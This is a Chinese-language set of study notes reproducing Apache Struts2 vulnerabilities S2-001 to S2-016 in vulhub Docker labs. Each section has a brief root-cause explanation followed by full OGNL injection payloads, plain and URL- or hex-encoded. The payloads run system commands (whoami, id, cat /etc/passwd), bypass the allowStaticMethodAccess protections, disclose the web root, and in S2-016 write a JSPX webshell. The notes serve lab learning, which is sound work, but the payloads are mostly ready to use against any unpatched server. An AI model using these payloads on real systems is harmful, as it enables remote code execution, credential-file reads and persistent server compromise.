# Struts2 漏洞复现合集学习笔记

## **S2-001复现**

### 原理：

~~~
  该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。
~~~

### 漏洞环境搭建

https://github.com/vulhub/vulhub/tree/master/struts2/s2-001

运行以下命令进行设置

```
docker-compose build
docker-compose up -d
```

访问 http://127.0.0.1:8080/

![http://127.0.0.1:8080/](E:\学习\picture\image-20220329230339236.png)

### 漏洞poc测试

1.输入**%{‘123’}**，sumbit

![image-20220329230626576](E:\学习\picture\image-20220329230626576.png)

2.返回123，参数值，证明漏洞存在

![image-20220329230736190](E:\学习\picture\image-20220329230736190.png)

### 构造poc

1. #### 获取tomcat路径：

   ~~~
   %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
   ~~~

   ![image-20220329231256122](E:\学习\picture\image-20220329231256122.png)

   语句执行后，查看返回的语句信息：

   ![image-20220329231351168](E:\学习\picture\image-20220329231351168.png)

2. #### 获取网站真实路径：

   ~~~
   %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
   ~~~

   ![image-20220329231515325](E:\学习\picture\image-20220329231515325.png)

   ![image-20220329231641526](E:\学习\picture\image-20220329231641526.png)

   

3. #### 构造查看权限的poc：

   ~~~
   %{
   
   #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
   
   #b=#a.getInputStream(),
   
   #c=new java.io.InputStreamReader(#b),
   
   #d=new java.io.BufferedReader(#c),
   
   #e=new char[50000],
   
   #d.read(#e),
   
   #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
   
   #f.getWriter().println(new java.lang.String(#e)),
   
   #f.getWriter().flush(),#f.getWriter().close()
   
   }
   ~~~

   ![image-20220329231953711](E:\学习\picture\image-20220329231953711.png)

4. #### 执行任意命令只需要将上面的poc中whoami替换：

   ~~~~
   %{
   
   #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),
   
   #b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),
   
   #d=new java.io.BufferedReader(#c),
   
   #e=new char[50000],#d.read(#e),
   
   #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
   
   #f.getWriter().println(new java.lang.String(#e)),
   
   #f.getWriter().flush(),
   
   #f.getWriter().close()
   
   }
   ~~~~

   ![image-20220329232113613](E:\学习\picture\image-20220329232113613.png)

5. #### 执行命令（带参数的命令：`new java.lang.String[]{"cat","/etc/passwd"}`）：

   ~~~~
   %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
   ~~~~

   ![image-20220329231930856](E:\学习\picture\image-20220329231930856.png)

### 关闭docker环境

~~~
命令：docker-compose down -v
~~~

## S2-005复现

~~~text
s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开
~~~

**影响版本：Struts 2.0.0-2.1.8.1**

### 漏洞搭建

~~~~
https://github.com/vulhub/vulhub/tree/master/struts2/s2-005
~~~~

运行以下命令启动环境

```
docker-compose build
docker-compose up -d
```

搭建成功：

![image-20220330205122843](E:\学习\picture\image-20220330205122843.png)

### 构建poc

使用抓包工具burp suite，修改数据包插入poc

~~~poc
(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
~~~

![image-20220330210413069](E:\学习\picture\image-20220330210413069.png)

**Poc2：**

~~~~
?%27%2B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29%2B%27
~~~~

![image-20220330210547380](E:\学习\picture\image-20220330210547380.png)

### 查看数据连接状态

命令：

~~~
docker exec -it c25543ef6c4c /bin/bash
~~~

ls /tmp

![image-20220330210920367](E:\学习\picture\image-20220330210920367.png)

## S2-008复现

### 原理：

~~~~text
S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。
~~~~

**影响版本：Struts 2.1.0 – 2.3.1**

### 漏洞搭建

~~~
https://github.com/vulhub/vulhub/tree/master/struts2/s2-008
~~~

### poc构建

例如`?debug=command&expression=<OGNL EXP>`在`devMode`mode中添加参数，OGNL表达式会直接执行，可以执行命令：

~~~~
devmode.action?debug=command&expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id
~~~~

![image-20220330214444897](E:\学习\picture\image-20220330214444897.png)

## **S2-009复现**

### 原理：

~~~
OGNL提供了广泛的表达式评估功能等功能。该漏洞允许恶意用户绕过ParametersInterceptor内置的所有保护（正则表达式，拒绝方法调用），从而能够将任何暴露的字符串变量中的恶意表达式注入进行进一步评估。ParametersInterceptor中的正则表达式将top ['foo']（0）作为有效的表达式匹配，OGNL将其作为（top ['foo']）（0）处理，并将“foo”操作参数的值作为OGNL表达式求值。这使得恶意用户将任意的OGNL语句放入由操作公开的任何String变量中，并将其评估为OGNL表达式，并且由于OGNL语句在HTTP参数中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法，绕过ParametersInterceptor和OGNL库保护。
~~~

**影响版本：Struts 2.1.0 - 2.3.1.1**

### 环境搭建

![image-20220330215657186](E:\学习\picture\image-20220330215657186.png)

### poc构建

burp，修改数据包

~~~
/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
~~~

![image-20220330220451094](E:\学习\picture\image-20220330220451094.png)

![image-20220330220528038](E:\学习\picture\image-20220330220528038.png)

## **S2-012复现**

### 原理：

~~~~
如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。
~~~~

**影响版本：Struts 2.1.0-2.3.13**



~~~~
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package>
~~~~



### 漏洞搭建

![image-20220331100903429](E:\学习\picture\image-20220331100903429.png)

### poc构建

~~~~
%25%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%22%2f%62%69%6e%2f%62%61%73%68%22%2c%22%2d%63%22%2c%20%22%6c%73%22%7d%29%29%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%66%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%66%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d
~~~~

![image-20220331102422871](E:\学习\picture\image-20220331102422871.png)

Poc2：

原始poc：

~~~~
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash","-c", "ls})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
~~~~

**注：利用此漏洞需要进行url编码**

~~~
%25%7B#a=(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22cat%22,%20%22/etc/passwd%22%7D)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new%20java.io.InputStreamReader(#b),#d=new%20java.io.BufferedReader(#c),#e=new%20char%5B50000%5D,#d.read(#e),#f=#context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22),#f.getWriter().println(new%20java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()%7D
~~~

![image-20220331102633729](E:\学习\picture\image-20220331102633729.png)

## **S2-013复现**

### 原理

~~~
struts2的标签中 和 都有一个 includeParams 属性，可以设置成如下值

none - URL中不包含任何参数（默认）
get - 仅包含URL中的GET参数
all - 在URL中包含GET和POST参数
此时 或尝试去解析原始请求参数时，会导致OGNL表达式的执行
~~~

**影响版本：Struts 2.0.0-2.3.14**

### 漏洞搭建

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/03/31/20220331222938.png)

Struts2 的标签`<s:a>`和`<s:url>`提供了一个 includeParams 属性。该属性的主要作用域是了解是否包含 http 请求参数。

includeParams 的允许值为：

1. none - 在 URL 中不包含任何参数（默认）
2. get - 在 URL 中仅包含 GET 参数
3. all - 在 URL 中包含 GET 和 POST 参数

当 时`includeParams=all`，这个请求的 GET 和 POST 参数放在 URL 的 GET 参数上。在此过程中，参数将被 OGNL 表达式解析。它导致命令执行。

### poc构建

~~~~
a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
~~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/01/20220401133558.png)

## S2-015复现

### 原理

漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：

~~~
<package name="S2-015" extends="struts-default">
    <action name="*" class="com.demo.action.PageAction">
        <result>/{1}.jsp</result>
    </action>
</package>
~~~

上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / " \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。

在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 `#_memberAccess['allowStaticMethodAccess']=true` 来修改其值达到重获静态方法调用的能力。

这里为了到达执行命令的目的可以用 调用动态方法 (new java.lang.ProcessBuilder('calc')).start() 来解决

### poc

~~~~
执行命令：
%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e
~~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/01/20220401143321.png)

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/01/20220401143542.png)

**执行ls，查看文件**

~~~~
${#context[‘xwork.MethodAccessor.denyMethodExecution’]=false,#m=#_memberAccess.getClass().getDeclaredField(‘allowStaticMethodAccess’),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(‘ls’).getInputStream()),#q}.action
~~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/01/20220401143728.png)

执行失败，需要转url编码（可以使用火狐自带hackbar）

~~~
/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action
~~~

![image-20220401144643050](E:\学习\picture\image-20220401144643050.png)

****

## S2-016 复现

影响版本: 2.0.0 - 2.3.15

### 原理

在struts2中，DefaultActionMapper类支持以"action:"、"redirect:"、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。

所以，访问`http://your-ip:8080/index.action?redirect:OGNL表达式`即可执行OGNL表达式。

### poc

执行命令，通过火狐将表达式转url编码

~~~~
redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("uname -a").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}
~~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/01/20220401150610.png)

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/01/20220401150650.png)

获取web目录：

~~~~
redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#ot=#resp.getWriter (),#ot.print('web'),#ot.print('path:'),#ot.print(#req.getSession().getServletContext().getRealPath('/')),#ot.flush(),#ot.close()}
~~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/01/20220401151219.png)

写入webshell：

~~~~
redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#b=new java.io.FileOutputStream(new java.lang.StringBuilder(#a.getRealPath("/")).append(@java.io.File@separator).append("1.jspx").toString()),#b.write(#a.getParameter("t").getBytes()),#b.close(),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println("BINGO"),#genxor.flush(),#genxor.close()}
~~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/01/20220401151351.png)

